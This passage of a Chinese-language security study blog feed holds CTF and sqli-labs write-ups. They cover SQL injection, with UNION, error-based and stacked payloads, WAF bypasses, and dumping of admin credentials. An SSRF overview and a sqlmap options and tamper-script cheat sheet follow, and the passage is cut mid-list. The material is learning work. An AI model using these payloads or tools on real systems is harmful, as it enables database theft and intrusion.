<li><h5 id="爆字段数，以成功联合注入"><a href="#爆字段数，以成功联合注入" class="headerlink" title="爆字段数，以成功联合注入"></a>爆字段数，以成功联合注入</h5></li>
</ol>
<p>​	<code>?id=1&#39; order by 1 --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png" alt="1-1"></p>
<p>​	发现有WAF，这里使用大写绕过</p>
<p>​	<code>?id=1&#39; Order by 1 --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-2.png" alt="1-2"></p>
<p>​	一直尝试直到<code>?id=1&#39; Order by 6 --+</code>没有回显，说明字段数为5</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-3.png" alt="1-3"></p>
<ol start="3">
<li><h5 id="联合注入爆数据库名"><a href="#联合注入爆数据库名" class="headerlink" title="联合注入爆数据库名"></a>联合注入爆数据库名</h5></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-4.png" alt="1-4"></p>
<p>​	可见，数据库名就是ctf</p>
<p>​	到这里答案就是到手的鸭子了</p>
<ol start="4">
<li><h5 id="顺藤摸瓜，找到表名"><a href="#顺藤摸瓜，找到表名" class="headerlink" title="顺藤摸瓜，找到表名"></a>顺藤摸瓜，找到表名</h5></li>
</ol>
<p><code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA =&#39;ctf&#39; --+</code></p>
<p>​	<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-5.png" alt="1-5"></p>
<p>​	显然flag在here_is_flag这个表中，但我们先要找到在哪个字段下（当然一般可以直接猜出来字段名为flag）</p>
<ol start="5">
<li><h5 id="再找到字段名"><a href="#再找到字段名" class="headerlink" title="再找到字段名"></a>再找到字段名</h5></li>
</ol>
<p>​	<code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =&#39;here_is_flag&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-6.png" alt="1-6"></p>
<ol start="6">
<li><h5 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h5></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-7.png" alt="1-7"></p>
<p>​	大功告成</p>
<hr>
<h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>点进去发现有两个模块，一个新闻页面，一个登录页面。</p>
<ol>
<li><h5 id="找到注入位置"><a href="#找到注入位置" class="headerlink" title="找到注入位置"></a>找到注入位置</h5></li>
</ol>
<p>点开热点中的热点一，发现这里有一个php请求，猜测是否这里有sql注入（为什么呢）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-1.png" alt="2-1"></p>
<ol start="2">
<li><h5 id="开始注入（公式化）"><a href="#开始注入（公式化）" class="headerlink" title="开始注入（公式化）"></a>开始注入（公式化）</h5></li>
</ol>
<p>爆字段数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-2.png" alt="2-2"></p>
<p>爆库名</p>
<p><code>?id=-1 union select 1,database() --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-3.png" alt="2-3"></p>
<p>爆表名</p>
<p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-4.png" alt="2-4"></p>
<p>爆字段名</p>
<p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-5.png" alt="2-5"></p>
<p>爆字段值</p>
<p><code>?id=-1 union select 1,group_concat(username,&#39;,&#39;,password) from news.admin --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-6.png" alt="2-6"></p>
<p>得到账号密码后就去登录吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-7.png" alt="2-7"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-8.png" alt="2-8"></p>
<p>完结撒花*★,°<em>:.☆(￣▽￣)&#x2F;$:</em>.°★* 。</p>
<hr>
<h2 id="CTF-BugKu-sqli-0x1"><a href="#CTF-BugKu-sqli-0x1" class="headerlink" title="CTF-BugKu-sqli-0x1"></a>CTF-BugKu-sqli-0x1</h2><p><a href="https://blog.csdn.net/weixin_73625393/article/details/137773172">https://blog.csdn.net/weixin_73625393/article/details/137773172</a></p>
<p><a href="http://danielw.top/index.php/daniel/340/">http://danielw.top/index.php/daniel/340/</a></p>
<p>没有变化，使用的是POST传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233313019.png" alt="image-20241115233313019"></p>
<p>打开源代码看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233348097.png" alt="image-20241115233348097"></p>
<p>发现有提示。查看这个php文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233653921.png" alt="image-20241115233653921"></p>
<p>待水平进步再来做这个qaq</p>
<h2 id="CTF-BugKu-login1"><a href="#CTF-BugKu-login1" class="headerlink" title="CTF-BugKu-login1"></a>CTF-BugKu-login1</h2><p><a href="https://blog.csdn.net/lga0325/article/details/143353230">https://blog.csdn.net/lga0325/article/details/143353230</a></p>
<p>在登录密码是，账号默认为admin，输入各种万能密码都没用</p>
<p>查看注册页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115235406854.png" alt="image-20241115235406854"></p>
<p>发现admin已经存在了</p>
<p>这个时候考虑SQL约束攻击</p>
<p>在注册用户时，因为 insert 插入数据受到数据库定义的长度限制，会自动将超出长度的数据截断。因此，如果 uname 的长度限制为 char(7)，那么注册账号<code>&#39;admin a&#39;</code>时，由于长度超出，则后面的 <code>a</code> 会被截断，此时，数据库存储数据会把空格删除，在数据库内就变成了<code>admin</code>        （？怎么会有七个字符？）</p>
<p>此时登录时使用 admin 和自己注册的密码登录，数据库返回注册时的账号信息，但是如果业务侧仅根据返回的用户名信息判断权限，则会导致水平越权的漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000616003.png" alt="image-20241116000616003"></p>
<p>注册成功，注意用户名这里有一个空格</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000703445.png" alt="image-20241116000703445"></p>
<p>直接使用admin身份登录得到flag</p>
<h2 id="SWPUCTF-2024-秋季新生赛-ez-sql"><a href="#SWPUCTF-2024-秋季新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]ez_sql"></a>[SWPUCTF 2024 秋季新生赛]ez_sql</h2><p>判断为字符型</p>
<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181637345.png" alt="image-20250307181637345"></p>
<p>他将输入内容转化为十六进制ASCII码，所以直接通过hackerbar修改url的话需要进一步转化一下。所以为了方便直接再textbox里注入</p>
<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181606149.png" alt="image-20250307181606149"></p>
<p>这里发现有报错回显，所以可以使用联合注入。但是这时发现有典型的闭合方式错误。</p>
<p><a href="https://blog.csdn.net/cyynid/article/details/128630181">https://blog.csdn.net/cyynid/article/details/128630181</a></p>
<p>最后得出是 # 闭合</p>
<p>1’ order by 5# –+</p>
<p>1’ union select 1,2,3,4;# –+</p>
<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307182041961.png" alt="image-20250307182041961"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab（一）</title>
    <url>/2024/11/09/SQLi/sql-lab/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h1><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/sql1.png" alt="sql1"></p>
<p>图内补充：<br>table_schema ： 表归属于的数据库</p>
<p>information_schema：这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p>
<p>查询当前用户：<code>select user（）</code></p>
<p>数据库版本： <code>select version （）</code></p>
<p>数据库名： <code>select database（）</code></p>
<p>查看数据库&#x2F;表：<code>show databases/tables；</code></p>
<p>切换数据库： <code>use 数据库名</code></p>
<p>基础查询：<code>select 字段1， 字段2, … from 表名；</code>   <code>select * from 表名；</code></p>
<p>条件查询：<code>select 字段 from 表名 where 条件</code></p>
<p><strong>联合查询：<code>select * from 表名 union select 1，2，3</code></strong>  </p>
<p>排序： <code>select * from 表名 order by 字段</code></p>
<hr>
<h1 id="SQL注入常见类型"><a href="#SQL注入常见类型" class="headerlink" title="SQL注入常见类型"></a>SQL注入常见类型</h1><h2 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数x为整形时，即select  *  from  &lt;表名 &gt;  where id &#x3D; x</p>
<p>判断： 1 and 1 &#x3D; 1           1 and 1 &#x3D; 2        比较两者的返回页面</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数x为字符型时，即select * from &lt;表名&gt; where id &#x3D; ‘x’</p>
<p>判断： 1‘ and ‘1’ &#x3D; ‘1          1’ and ‘1’ &#x3D; ‘2 </p>
<h2 id="按获取方式分类"><a href="#按获取方式分类" class="headerlink" title="按获取方式分类"></a><strong>按获取方式分类</strong></h2><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p>利用页面回显的数据库报错信息</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在注入点的判断过程中，SQL语句执行后的报错信息会经过后端显示在页面中华</p>
<h4 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h4><p>floor()	<strong>extractvalue()	updatexml()</strong>	geometrycollection()	polygon()	multipolygon()</p>
<p><strong>concat()</strong></p>
<h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><p><code>concat(str1, str2,…)</code></p>
<p>将多个字符串连接成一个字符串</p>
<h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h5><p><code>group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</code></p>
<p>使用distinct可以排除重复值</p>
<p>如果需要对结果中的值进行排序，可以使用order by子句</p>
<p>separator是一个字符串值，默认为逗号</p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;)</code></p>
<p>从目标xml文件中返回包含查询值的字符串</p>
<p><strong>extractvalue函数一次只能查询32位长度</strong></p>
<p>解决方案：</p>
<ol>
<li>加上<code>limit x,1</code> 逐一查询</li>
<li>用group_concat函数把查询结果分组聚合，然后用<code>and xxxx not in ’xxx‘，’xxx‘</code>过滤掉前面回显的</li>
<li>用<code>substring()</code>截取</li>
</ol>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>updatexml(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;,&#39;替换后的值&#39;)</code></p>
<p>修改xml文件中符合字符串的值</p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>利用页面返回的不一致</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用页面响应时间</p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>使用union关键字</p>
<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>执行多条SQL语句</p>
<hr>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p>&#x2F;**&#x2F; </p>
<h3 id="and-or被过滤"><a href="#and-or被过滤" class="headerlink" title="and&#x2F;or被过滤"></a>and&#x2F;or被过滤</h3><p>&amp;&amp; ||</p>
<hr>
<h1 id="SQLi-labs"><a href="#SQLi-labs" class="headerlink" title="SQLi-labs"></a>SQLi-labs</h1><h3 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h3><h4 id="基于报错的注入-1"><a href="#基于报错的注入-1" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h4><ol>
<li>验证是字符型还是数字型注入</li>
</ol>
<p>​	<code>?id = 1 and 1 = 1</code>         和    <code>?id = 1 and 1 = 2</code></p>
<p>​	<code>?id = 1&#39; and &#39;1&#39; = &#39;1</code> 和   <code>?id = 1&#39; and &#39;1&#39;=&#39;2</code></p>
<p>​       判断两次回显结果是否相同。</p>
<ol>
<li><p>查询当前数据库</p>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select database()),0x7e))) --+</code>、</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110003235758.png" alt="image-20241110003235758"></p>
<p>爆出数据库名为security</p>
<p>当然用union也可以</p>
</li>
<li><p>查询表名</p>
</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110004543422.png" alt="image-20241110004543422"></p>
<ol start="4">
<li>查询字段名</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005049115.png" alt="image-20241110005049115"></p>
<ol start="5">
<li>查询字段值</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(id,&#39;,&#39;,email_id) from security.emails),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005953540.png" alt="image-20241110005953540"></p>
<p>发现没有显示完</p>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#39;,&#39;,email_id),80,40) from security.emails),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110010136450.png" alt="image-20241110010136450"></p>
<p>试着这样查询一下账号和密码吧</p>
<h4 id="联合注入法"><a href="#联合注入法" class="headerlink" title="联合注入法"></a>联合注入法</h4><p>1.爆字段数量</p>
<p>order by</p>
<p>2.爆数据库名</p>
<p>union select </p>
<p>注意修改id修改为负数。</p>
<p>先试试看哪些位置可以回显出来。</p>
<p>3.爆表名</p>
<p>4.爆字段名</p>
<p>5.爆字段值</p>
<h3 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson 2"></a>lesson 2</h3><p>过程和lesson 1一样。只不过是数字型注入。</p>
<h3 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson 3"></a>lesson 3</h3><p>过程和lesson 1一样，不过闭合方式为 ‘）</p>
<h3 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson 4"></a>lesson 4</h3><p>过程和lesson 1一样，不过闭合方式为 ”）</p>
<h3 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson 5"></a>lesson 5</h3><p>也可以这样做</p>
<h3 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson 6"></a>lesson 6</h3><p>也可以这样做</p>
<p>怎么都有报错回显。布尔盲注和时间盲注有点暴力有点纯。使用sqlmap会好得多但是我暂时不会用</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2025/03/18/SQLi/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>平常我们注入时都是通常对原来sql语句传输数据的地方进行相关修改，注入情况会应为该语句本身的情况而受到相关限制，例如进行select语句的时候，无法进行增、删、改。但堆叠注入则完全打破了这种限制，其名字顾名思义，就是可以堆一堆sql注入进行注入，这个时候我们就不受前面语句的限制可以为所欲为了。原理就是将原来的语句构造完后加上分号。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>当输入123的时候弹出以下内容。并同时发现这里是POST传参。</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204200052.png" alt="image-20250312204200052" style="zoom: 50%;">

<p>尝试进行字符和数字的验证，发现当输入万能密码的时候情况如下。这里应该是对and等等关键词进行了过滤。</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204306434.png" alt="image-20250312204306434" style="zoom:50%;">

<p>常规思路不太行，而且回文只有这几种。于是考虑堆叠注入。</p>
<ol>
<li>得到库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=0;show databases;</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204503297.png" alt="image-20250312204503297" style="zoom: 80%;">

<p>发现过滤的东西太多了。这道题目前对我来说有点偏，只放个链接在这</p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/111398725">https://blog.csdn.net/RABCDXB/article/details/111398725</a></p>
<p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
]]></content>
  </entry>
  <entry>
    <title>SSRF漏洞</title>
    <url>/2025/03/18/SSRF/SSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>SSRF（server-side request forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
<h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h3><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p>将整个文件或一个url所指向的文件读入一个字符串中</p>
<h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p>输出一个文件的内容</p>
<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p>打开一个网络连接或者一个Unix套接字连接</p>
<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>初始化一个新的会话，返回一个CURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用</p>
<h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h5><p>打开一个文件或者url</p>
<h5 id="PHP原生类SoapClient在触发反序列化时可导致SSRF"><a href="#PHP原生类SoapClient在触发反序列化时可导致SSRF" class="headerlink" title="PHP原生类SoapClient在触发反序列化时可导致SSRF"></a>PHP原生类SoapClient在触发反序列化时可导致SSRF</h5><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>在有回显的情况下，利用file协议可以读取任意文件的内容</p>
<h5 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h5><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
<h5 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h5><p>支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议时ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell</p>
<h5 id="http-s协议"><a href="#http-s协议" class="headerlink" title="http&#x2F;s协议"></a>http&#x2F;s协议</h5><p>探测内网主机存活</p>
<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><ol>
<li>让服务端去访问相应的网址</li>
<li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li>
<li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li>
<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</li>
<li>攻击内网应用程序（利用跨协议通信技术）</li>
<li>判断内网主机是否存活：方法是访问看是否有端口开放</li>
<li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li>
</ol>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2025/03/18/SQLi/Sqlmap%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--version                         <span class="comment">#显示程序的版本号并退出</span></span><br><span class="line">-h, --<span class="built_in">help</span>                        <span class="comment">#显示此帮助消息并退出</span></span><br><span class="line">-u                                <span class="comment">#设置目标URL</span></span><br><span class="line">-p                                <span class="comment">#指定测试参数</span></span><br><span class="line">-D                                <span class="comment">#指定要进行枚举的数据库名</span></span><br><span class="line">-U                                <span class="comment">#指定要进行枚举的数据库表</span></span><br><span class="line">-T       						<span class="comment">#枚举列的信息</span></span><br><span class="line">-C                                <span class="comment">#指定要进行枚举的数据库列</span></span><br><span class="line">-U                                <span class="comment">#指定要进行枚举的数据车用户</span></span><br><span class="line">--current-user                    <span class="comment">#获取当前用户名称</span></span><br><span class="line">--current-db                      <span class="comment">#获取当前数据库名称</span></span><br><span class="line">--cookie                          <span class="comment">#设置cookie值</span></span><br><span class="line">--dbs                             <span class="comment">#列出数据库</span></span><br><span class="line">--tables                          <span class="comment">#列出数据库中的表</span></span><br><span class="line">--columns                         <span class="comment">#列出表中的列</span></span><br><span class="line">--dump                            <span class="comment">#列出表中的字段</span></span><br><span class="line">--sql-shell                       <span class="comment">#执行SQL命令</span></span><br><span class="line">--os-cmd                          <span class="comment">#执行系统命令</span></span><br><span class="line">--os-shell                        <span class="comment">#与系统交互shell</span></span><br><span class="line">-r                                <span class="comment">#加载外部请求包</span></span><br><span class="line">--batch                           <span class="comment">#使用默认参数进行</span></span><br><span class="line">--data=DATA                       <span class="comment">#通过POST发送数据字符串</span></span><br><span class="line">--level=LEVEL                     <span class="comment">#执行测试的等级（1-5，默认为1)</span></span><br><span class="line">--risk=RISK                       <span class="comment">#执行测试的风险（O-3，默认为1)</span></span><br><span class="line">-v VERBOSE                        <span class="comment">#详细级别:0-6(默认为1)</span></span><br><span class="line">--proxy=PROXY                     <span class="comment">#使用HTTP代理连接到目标URL</span></span><br><span class="line">--user-agent                      <span class="comment">#指定HTTP User-Agent</span></span><br><span class="line">--tamper=TAMPER                   <span class="comment">#使用给定的脚本(S)篡改注入数据</span></span><br><span class="line">--random-agent                    <span class="comment">#随机的请求头!</span></span><br></pre></td></tr></table></figure>



<h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用方法--tamper xxx.py</span></span><br><span class="line"> </span><br><span class="line">apostrophemask.py	<span class="comment"># 用UTF-8全角字符替换单引号字符</span></span><br><span class="line">apostrophenullencode.py 	<span class="comment"># 用非法双字节unicode字符替换单引号字符</span></span><br><span class="line">appendnullbyte.py	<span class="comment"># 在payload末尾添加空字符编码</span></span><br><span class="line">base64encode.py 	<span class="comment"># 对给定的payload全部字符使用Base64编码</span></span><br><span class="line">between.py		<span class="comment"># 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span></span><br><span class="line">bluecoat.py 	<span class="comment"># 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span></span><br><span class="line">chardoubleencode.py 	<span class="comment"># 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span></span><br><span class="line">charencode.py	 <span class="comment"># 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span></span><br><span class="line">charunicodeencode.py 	 <span class="comment"># 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span></span><br><span class="line">concat2concatws.py 		<span class="comment"># 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span></span><br><span class="line">equaltolike.py 		<span class="comment"># 用“LIKE”运算符替换全部等于号“=”</span></span><br><span class="line">greatest.py 		<span class="comment"># 用“GREATEST”函数替换大于号“&gt;”</span></span><br><span class="line">halfversionedmorekeywords.py 	<span class="comment"># 在每个关键字之前添加MySQL注释</span></span><br><span class="line">ifnull2ifisnull.py 		<span class="comment"># 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span></span><br><span class="line">lowercase.py 		<span class="comment"># 用小写值替换每个关键字字符</span></span><br><span class="line">modsecurityversioned.py 	<span class="comment"># 用注释包围完整的查询</span></span><br><span class="line">modsecurityzeroversioned.py 		<span class="comment"># 用当中带有数字零的注释包围完整的查询</span></span><br><span class="line">multiplespaces.py 		<span class="comment"># 在SQL关键字周围添加多个空格</span></span><br><span class="line">nonrecursivereplacement.py 		<span class="comment"># 用representations替换预定义SQL关键字，适用于过滤器</span></span><br><span class="line">overlongutf8.py 		<span class="comment"># 转换给定的payload当中的所有字符</span></span><br><span class="line">percentage.py 		<span class="comment"># 在每个字符之前添加一个百分号</span></span><br><span class="line">randomcase.py 		<span class="comment"># 随机转换每个关键字字符的大小写</span></span><br><span class="line">randomcomments.py 		<span class="comment"># 向SQL关键字中插入随机注释</span></span><br><span class="line">securesphere.py 		<span class="comment"># 添加经过特殊构造的字符串</span></span><br><span class="line">sp_password.py 		<span class="comment"># 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span></span><br><span class="line">space2comment.py 		<span class="comment"># 用“/**/”替换空格符</span></span><br><span class="line">space2dash.py 		<span class="comment"># 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2hash.py 		<span class="comment"># 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2morehash.py 		<span class="comment"># 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2mssqlblank.py 		<span class="comment"># 用一组有效的备选字符集当中的随机空白符替换空格符</span></span><br><span class="line">space2mssqlhash.py 		<span class="comment"># 用磅注释符“#”其次是一个换行符替换空格符</span></span><br><span class="line">space2mysqlblank.py 		<span class="comment"># 用一组有效的备选字符集当中的随机空白符替换空格符</span></span><br><span class="line">space2mysqldash.py 			<span class="comment"># 用破折号注释符“--”其次是一个换行符替换空格符</span></span><br><span class="line">space2plus.py 		<span class="comment"># 用加号“+”替换空格符</span></span><br><span class="line">space2randomblank.py 		<span class="comment"># 用一组有效的备选字符集当中的随机空白符替换空格符</span></span><br><span class="line">unionalltounion.py 		<span class="comment"># 用“UNION 